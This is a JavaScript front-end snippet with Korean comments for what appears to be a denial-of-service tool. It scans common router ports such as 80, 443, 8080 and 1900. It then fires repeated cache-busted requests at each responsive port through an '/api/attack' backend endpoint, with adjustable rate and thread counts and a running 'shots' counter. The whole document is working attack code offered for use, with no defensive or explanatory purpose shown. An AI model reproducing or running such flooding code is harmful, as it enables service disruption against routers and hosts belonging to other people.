<script>
    let attackInterval = null;
    let totalShots = 0;
    const commonPorts = [80, 443, 8080, 8443, 1900, 5000, 8888, 3000]; // 공유기 주요 급소

    async function scanAndFire() {
        const baseTarget = document.getElementById('target').value.replace(/\/$/, "");
        log("🔍 AUTO SCANNING TARGET PORTS...");

        // 1. 유효한 포트 찾기 (병렬 스캔)
        const openPorts = [];
        await Promise.all(commonPorts.map(async (port) => {
            try {
                const controller = new AbortController();
                const id = setTimeout(() => controller.abort(), 1500); // 1.5초 내 응답 없으면 패스
                await fetch(`${baseTarget}:${port}`, { mode: 'no-cors', signal: controller.signal });
                openPorts.push(port);
                log(`[FOUND] PORT ${port} IS RESPONSIVE`);
            } catch (e) { /* ignore closed */ }
        }));

        // 2. 타격 시작
        if (openPorts.length === 0) {
            log("⚠️ NO SPECIFIC PORTS FOUND. DEFAULTING TO HTTP...", true);
            openPorts.push(80);
        }

        startAttack(baseTarget, openPorts);
    }

    function startAttack(baseTarget, ports) {
        const rate = parseInt(document.getElementById('rate').value);
        const threads = parseInt(document.getElementById('threads').value);
        
        document.getElementById('statusText').innerText = "LOCK-ON FIRING";
        document.getElementById('statusText').style.color = "red";

        attackInterval = setInterval(() => {
            ports.forEach(port => {
                for(let i=0; i < threads; i++) {
                    const finalUrl = `${baseTarget}:${port}?cache=${Math.random()}`;
                    fetch(`/api/attack?target=${encodeURIComponent(finalUrl)}`)
                        .then(() => {
                            totalShots += 1000;
                            document.getElementById('shotCount').innerText = totalShots.toLocaleString();
                        }).catch(() => {});
                }
            });
        }, rate);
        log(`🚀 MULTI-PORT ATTACK STARTED ON: ${ports.join(", ")}`);
    }
    
    // 기존 terminate 함수 유지
</script>
